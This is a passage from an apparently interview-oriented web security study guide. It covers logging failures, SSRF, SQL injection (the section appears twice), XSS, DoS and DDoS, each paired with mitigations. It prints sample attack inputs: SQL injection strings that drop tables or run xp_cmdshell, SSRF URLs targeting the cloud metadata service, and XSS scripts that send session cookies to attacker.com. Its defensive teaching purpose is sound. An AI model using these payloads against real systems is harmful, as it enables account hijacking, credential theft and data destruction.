crossorigin="anonymous">
</script>
```

✅ Secure CI/CD pipelines

✅ Never deserialize untrusted data

✅ Sign all software releases

---

## 🔷 #9 — Security Logging and Monitoring Failures

### WHAT

Occurs when security events are not logged, monitored, or acted upon.

Attackers may remain undetected for months.

Examples:

❌ Failed logins not recorded

❌ No alerts for brute-force attacks

❌ Logs stored only on compromised servers

❌ No monitoring of suspicious database activity

❌ Logs reviewed only occasionally

---

### Typical Attack Scenario

```text
Attacker Performs Brute Force
        │
        ▼
Thousands of Failed Logins
        │
        ▼
No Logging
        │
        ▼
No Alerts
        │
        ▼
Compromise Goes Undetected ❌
```

---

### Real Impact

- Delayed breach detection
- Larger attack impact
- Regulatory violations
- Difficult forensic investigations

---

### Fix

✅ Log all security events

Examples:

- Login attempts
- Failed authentication
- Privilege changes
- Access denied events
- Administrative actions

✅ Centralized logging

✅ Configure automated alerts

✅ Deploy Microsoft Sentinel

✅ Perform regular log reviews

✅ Create incident response procedures

---

### Azure Security Monitoring Stack

```text
Application / Infrastructure Logs
                │
                ▼
Azure Monitor
                │
                ▼
Log Analytics Workspace
                │
                ▼
Microsoft Sentinel
                │
                ▼
Threat Detection & Automated Response
```

Additional Security Service:

```text
Microsoft Defender for Cloud
```

Provides:

- Security posture assessments
- Threat alerts
- Vulnerability recommendations

---

## 🔷 #10 — Server-Side Request Forgery (SSRF)

### WHAT

SSRF occurs when an attacker tricks a server into sending requests to internal resources on the attacker's behalf.

The attacker cannot access the resource directly, so they abuse the application to do it.

---

### Normal Behavior

```text
User
    │
    ▼
https://myapp.com/fetch?url=https://example.com/image.jpg
    │
    ▼
Server Downloads Image
    │
    ▼
Returns Image to User ✅
```

---

### SSRF Attack

Attacker Sends:

```text
https://myapp.com/fetch?url=http://169.254.169.254/metadata/instance
```

Target:

```text
Azure Instance Metadata Service
```

The server performs the request:

```text
Server
    │
    ▼
Metadata Service
    │
    ▼
Returns Sensitive Information
```

Potential Exposure:

- Subscription IDs
- Managed Identity Tokens
- Internal IP Addresses
- VM Information

❌ Information disclosure

---

### Internal Network SSRF

Attacker Sends:

```text
https://myapp.com/fetch?url=http://10.0.1.4:8080/admin
```

Result:

```text
Server accesses internal admin panel
Attacker receives response ❌
```

---

### Real Impact

- Internal network reconnaissance
- Cloud credential theft
- Access to internal services
- Privilege escalation

---

### Fix

✅ WAF protection

✅ Validate URLs server-side

✅ Use allowlists

Example:

```text
Allowed Domains:

example.com
images.company.com
cdn.company.com
```

✅ Block requests to private IP ranges

```text
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.169.254
```

✅ Restrict metadata service access

---

# 5. SQL Injection

## 🔷 WHAT

SQL Injection (SQLi) is a vulnerability where attacker-controlled input is interpreted as SQL commands by the database.

This usually occurs when applications concatenate user input directly into SQL queries.

---

## 🔷 HOW It Works

### Vulnerable Code

```python
username = request.form['username']
password = request.form['password']

query = "SELECT * FROM users WHERE username='" + username + \
        "' AND password='" + password + "'"
```

---

### Attacker Input

```text
username = admin' --
password = anything
```

---

### Generated Query

```sql
SELECT *
FROM users
WHERE username='admin' --'
AND password='anything'
```

Explanation:

```text
-- = SQL Comment

Everything after -- is ignored.
```

Database Executes:

```sql
SELECT *
FROM users
WHERE username='admin'
```

Password validation removed ❌

Result:

```text
Attacker logs in as admin
without knowing the password ❌
```

---

## 🔷 Types of SQL Injection

| Type | Description | Example |
|--------|------------|----------|
| Classic / In-Band | Data returned directly | `' OR 1=1 --` |
| Blind Boolean | Infer data from True/False responses | `' AND 1=1 --` |
| Blind Time-Based | Infer data from response timing | `'; WAITFOR DELAY '0:0:5' --` |
| Error-Based | Extract information from DB errors | `' AND CONVERT(int,@@version) --` |
| Out-of-Band | Exfiltrate data through external channels | DNS/HTTP callbacks |

---

## 🔷 Real Attack Scenarios

### Scenario 1 — Authentication Bypass

```text
Input:
' OR '1'='1
```

Result:

```text
Login bypass ❌
```

---

### Scenario 2 — Data Extraction

```sql
' UNION SELECT username,password FROM users --
```

Result:

```text
Database usernames and passwords exposed ❌
```

---

### Scenario 3 — Database Destruction

```sql
'; DROP TABLE users; --
```

Result:

```text
Users table deleted ❌
```

---

### Scenario 4 — Command Execution

```sql
'; EXEC xp_cmdshell('whoami') --
```

Result:

```text
Operating system commands executed ❌
```

---

## 🔷 Prevention

### Most Important Control

✅ Parameterized Queries

❌ Vulnerable:

```python
query = "SELECT * FROM users WHERE id=" + user_id
```

✅ Safe:

```python
query = "SELECT * FROM users WHERE id=?"
cursor.execute(query, (user_id,))
```

Database treats input as DATA, not SQL code.

---

### Additional Protection

✅ WAF

✅ Input validation

✅ Stored procedures with parameterization

✅ Least privilege database accounts

✅ Hide database error messages

✅ Use ORM frameworks

Examples:

- Django ORM
- Entity Framework
- Hibernate
- SQLAlchemy

---

### Interview Memory Trick

```text
Vulnerable and Outdated Components
=
Known Vulnerability Exists

Authentication Failures
=
Weak Login Security

Software Integrity Failures
=
Trusting Unverified Code

Logging Failures
=
Attacks Not Detected

SSRF
=
Server Accessing Internal Resources

SQL Injection
=
Database Executes Attacker Input
```

---


# 5. SQL Injection (SQLi)

## 🔷 WHAT

**SQL Injection (SQLi)** is a vulnerability where attacker-controlled input is interpreted as SQL commands by the database.

It occurs when applications directly concatenate user input into SQL queries without proper parameterization.

---

## 🔷 HOW SQL Injection Works

### Vulnerable Code Example

```python
username = request.form['username']
password = request.form['password']

query = "SELECT * FROM users WHERE username='" + username + \
        "' AND password='" + password + "'"
```

---

### Attacker Input

```text
Username:
admin' --

Password:
anything
```

---

### Generated SQL Query

```sql
SELECT *
FROM users
WHERE username='admin' --'
AND password='anything'
```

Explanation:

```text
-- = SQL Comment

Everything after -- is ignored by the database.
```

Database Executes:

```sql
SELECT *
FROM users
WHERE username='admin'
```

Password validation removed ❌

Result:

```text
Attacker logs in as Admin
without knowing the password ❌
```

---

## 🔷 Types of SQL Injection

| Type | Description | Example |
|--------|------------|----------|
| Classic / In-Band | Results returned directly | `' OR 1=1 --` |
| Blind Boolean | Infer data from application responses | `' AND 1=1 --` |
| Blind Time-Based | Infer data from response delays | `'; WAITFOR DELAY '0:0:5' --` |
| Error-Based | Extract data from DB errors | `' AND CONVERT(int,@@version) --` |
| Out-of-Band | Exfiltrate data through DNS/HTTP | External callback |

---

## 🔷 Real Attack Scenarios

### Scenario 1 — Authentication Bypass

Attacker Input:

```sql
' OR '1'='1
```

Query:

```sql
SELECT *
FROM users
WHERE username=''
OR '1'='1'
AND password=''
```

Result:

```text
Authentication Bypass ❌
```

---

### Scenario 2 — Data Extraction

Attacker Input:

```sql
' UNION SELECT username,password FROM users --
```

Original Query:

```sql
SELECT name,description
FROM products
WHERE id=''
```

Modified Query:

```sql
SELECT name,description
FROM products
WHERE id=''

UNION

SELECT username,password
FROM users
```

Result:

```text
Database credentials exposed ❌
```

---

### Scenario 3 — Database Destruction

Attacker Input:

```sql
'; DROP TABLE users; --
```

Result:

```text
Users table deleted ❌
```

---

### Scenario 4 — Operating System Command Execution

Attacker Input:

```sql
'; EXEC xp_cmdshell('whoami') --
```

Result:

```text
Database executes OS command ❌
```

---

## 🔷 Prevention

### Most Important Defense

✅ Parameterized Queries (Prepared Statements)

❌ Vulnerable:

```python
query = "SELECT * FROM users WHERE id=" + user_id
```

✅ Safe:

```python
query = "SELECT * FROM users WHERE id=?"
cursor.execute(query, (user_id,))
```

Why it works:

```text
Database treats user input as DATA

NOT as executable SQL code
```

Injection becomes impossible ✅

---

### Additional Protection

✅ WAF

Detects common SQL Injection patterns.

✅ Input Validation

Allow only expected characters and formats.

✅ Stored Procedures

Use parameterized procedures.

✅ Least Privilege Database Accounts

Application account should not have:

- DROP TABLE
- CREATE USER
- ALTER DATABASE

permissions unless required.

✅ Hide Database Errors

Never display SQL errors to users.

✅ ORM Frameworks

Examples:

- Django ORM
- SQLAlchemy
- Hibernate
- Entity Framework

Most ORMs automatically parameterize queries.

---

## 🔷 SQL Injection Attack Flow

```text
Attacker
    │
    ▼
Malicious Input
(' OR 1=1 --)
    │
    ▼
Vulnerable Application
    │
    ▼
Unsafe SQL Query
    │
    ▼
Database Executes Query
    │
    ▼
Authentication Bypass /
Data Theft /
Data Destruction ❌
```

---

## 🔷 SQL Injection Defense Flow

```text
Attacker
    │
    ▼
Malicious Input
    │
    ▼
WAF Inspection
    │
    ▼
Parameterized Query
    │
    ▼
Database Treats Input As Data
    │
    ▼
Attack Blocked ✅
```

---

## 🔷 Interview Question

### Why Doesn't WAF Alone Solve SQL Injection?

Answer:

```text
WAF is an additional layer of defense.

The PRIMARY fix is parameterized queries.

If WAF is bypassed or misconfigured,
the application must still be secure.

Therefore:

1. Parameterized Queries
2. Input Validation
3. Least Privilege
4. WAF

Together provide Defense in Depth.
```

---

## 🔷 Quick Memory Trick

```text
SQL Injection
=
Attacker Input Becomes SQL Code

Fix
=
Parameterized Queries

WAF
=
Additional Protection Layer
```

---

### Exam / Interview One-Liner

```text
SQL Injection occurs when untrusted user input is executed as SQL commands by the database. The most effective mitigation is parameterized queries, supported by input validation, least-privilege access, and WAF protection.
```

---


# 6. XSS — Cross-Site Scripting

## 🔷 WHAT

**XSS (Cross-Site Scripting)** is an attack where an attacker injects malicious JavaScript into a web page that is then executed in the victim's browser.

The target is usually the user, not the server.

The application becomes the delivery mechanism for malicious code.

---

## 🔷 HOW XSS Works

### Stored XSS (Persistent XSS)

Most dangerous form of XSS.

Attack Flow:

```text
Attacker submits comment:
"Great article!
<script>
document.location='https://attacker.com/steal?c='+document.cookie
</script>"
        │
        ▼
Application stores comment in database
        │
        ▼
Victim visits page
        │
        ▼
Browser executes script
        │
        ▼
Session cookie stolen ❌
```

---

### Reflected XSS

Attack Flow:

```text
Attacker crafts malicious URL:

https://myapp.com/search?q=<script>alert(document.cookie)</script>

        │
        ▼
Victim clicks URL
        │
        ▼
Application reflects script in response
        │
        ▼
Browser executes script ❌
```

---

### DOM-Based XSS

Attack occurs entirely inside the browser.

```text
Malicious Input
        │
        ▼
JavaScript Manipulates DOM
        │
        ▼
Script Executes
```

No server-side reflection required.

More difficult for server-side WAFs to detect.

---

## 🔷 What Can an Attacker Do With XSS?

Once malicious JavaScript executes in a victim's browser:

❌ Steal session cookies

❌ Hijack user accounts

❌ Steal credentials

❌ Redirect users to phishing pages

❌ Install browser-based keyloggers

❌ Perform actions as the victim

❌ Mine cryptocurrency in browser

❌ Spread to other users

---

## 🔷 Real Example

Victim logs into:

```text
https://bank.com
```

Attacker's script executes:

```javascript
fetch(
"https://attacker.com/steal?cookie=" +
document.cookie
);
```

Result:

```text
Session Cookie Stolen ❌
```

Attacker may impersonate the victim.

---

## 🔷 Prevention

### Output Encoding (Most Important)

❌ Dangerous:

```html
<script>alert('xss')</script>
```

✅ Safe Output Encoding:

```html
&lt;script&gt;alert('xss')&lt;/script&gt;
```

Browser displays text instead of executing code.

---

### Content Security Policy (CSP)

Example:

```http
Content-Security-Policy:
script-src 'self'
```

Only trusted scripts can execute.

---

### HttpOnly Cookies

Example:

```http
Set-Cookie:
session=abc123;
HttpOnly;
Secure
```

JavaScript cannot access the cookie.

---

### Additional Controls

✅ WAF

✅ Input Validation

✅ Output Encoding

✅ Modern Frameworks

Examples:

- React
- Angular
- Vue

These automatically escape output by default.

---

## 🔷 XSS Attack Flow

```text
Attacker
    │
    ▼
Injects Malicious JavaScript
    │
    ▼
Application Stores/Returns Script
    │
    ▼
Victim Opens Page
    │
    ▼
Browser Executes Script
    │
    ▼
Account Compromise ❌
```

---

# 7. DoS — Denial of Service

## 🔷 WHAT

A **Denial of Service (DoS)** attack occurs when a single attacker overwhelms a service with excessive requests, causing legitimate users to lose access.

Goal:

```text
Availability Loss
```

---

## 🔷 Normal Operation

```text
Users
    │
    ▼
Server
    │
    ▼
Responses Returned ✅
```

---

## 🔷 During DoS Attack

```text
Attacker
    │
    ▼
Millions of Requests
    │
    ▼
Server Resources Exhausted
    │
    ▼
Legitimate Users Rejected ❌
```

---

## 🔷 Types of DoS Attacks

| Type | Description | Target |
|--------|------------|----------|
| Volume-Based | Massive traffic flood | Bandwidth |
| Protocol-Based | Exploits TCP/IP weaknesses | Network Resources |
| Application Layer | HTTP floods, Slowloris | Web Servers |
| Resource Exhaustion | Consumes connections | Memory/CPU |

---

## 🔷 SYN Flood Example

### Normal TCP Handshake

```text
Client → SYN
Server → SYN-ACK
Client → ACK

Connection Established ✅
```

---

### SYN Flood Attack

```text
Attacker → SYN (Fake IP #1)
Server → SYN-ACK

Attacker → SYN (Fake IP #2)
Server → SYN-ACK

Attacker → SYN (Fake IP #3)
Server → SYN-ACK

...
```

Server allocates memory for each connection.

ACK never arrives.

Result:

```text
Connection Table Full ❌

Legitimate Users Rejected ❌
```

---

## 🔷 Slowloris Attack

Attack Flow:

```text
Attacker Opens Thousands
of HTTP Connections
        │
        ▼
Sends Partial Requests
Very Slowly
        │
        ▼
Server Keeps Connections Open
        │
        ▼
Connection Pool Exhausted ❌
```

Uses very little bandwidth.

Difficult to detect.

---

## 🔷 DoS Characteristics

| Feature | Value |
|----------|--------|
| Source | Single Machine |
| Scale | Limited |
| Detection | Easier |
| Mitigation | Firewall, Rate Limiting |
| Cost to Attacker | Low |

---

# 8. DDoS — Distributed Denial of Service

## 🔷 WHAT

A **Distributed Denial of Service (DDoS)** attack is similar to DoS, but the attack originates from thousands or millions of devices simultaneously.

Attack traffic comes from a botnet.

---

## 🔷 Botnet Architecture

```text
Attacker
(Command & Control)
        │
        ├── Infected PC (Germany)
        │
        ├── Router (Japan)
        │
        ├── Smart TV (USA)
        │
        ├── Camera (Brazil)
        │
        └── Thousands More Devices
                    │
                    ▼
                Target
```

Result:

```text
Traffic from Thousands
of Different IPs ❌
```

Cannot simply block one IP.

---

## 🔷 Famous DDoS Attacks

| Attack | Year | Scale |
|----------|------|--------|
| Mirai Botnet | 2016 | 1.2 Tbps |
| GitHub Attack | 2018 | 1.35 Tbps |
| AWS Customer Attack | 2020 | 2.3 Tbps |
| Google Cloud Attack | 2022 | 46 Million Requests/Sec |

---

## 🔷 Layer 3/4 DDoS

Examples:

- UDP Flood
- ICMP Flood
- SYN Flood

Goal:

```text
Exhaust Network Resources
```

---

## 🔷 Layer 7 DDoS

Examples:

- HTTP Flood
- Slowloris
- API Abuse

Goal:

```text
Exhaust Application Resources
```

Harder to detect because requests look legitimate.

---

## 🔷 DoS vs DDoS

| Feature | DoS | DDoS |
|----------|-----|------|
| Source | Single Machine | Thousands of Machines |
| Scale | Small | Massive |
| Detection | Easier | Harder |
| Block Method | Block IP | Specialized Protection |
| Cost to Attacker | Low | Higher |
| Impact | Moderate | Severe |

---

## 🔷 Interview Memory Tricks

```text
XSS
=
Browser Executes Attacker JavaScript

SQL Injection
=
Database Executes Attacker SQL

DoS
=
One Machine Attacks

DDoS
=
Thousands of Machines Attack

Stored XSS
=
Saved in Database

Reflected XSS
=
Returned Immediately

DOM XSS
=
Browser Only
```

---

## 🔷 One-Line Definitions

### SQL Injection

```text
Attacker input is executed as SQL commands by the database.
```

### XSS

```text
Attacker input is executed as JavaScript in the victim's browser.
```

### DoS

```text
Single source overwhelms a service and makes it unavailable.
```

### DDoS

```text
Multiple compromised systems overwhelm a target simultaneously.
```

---
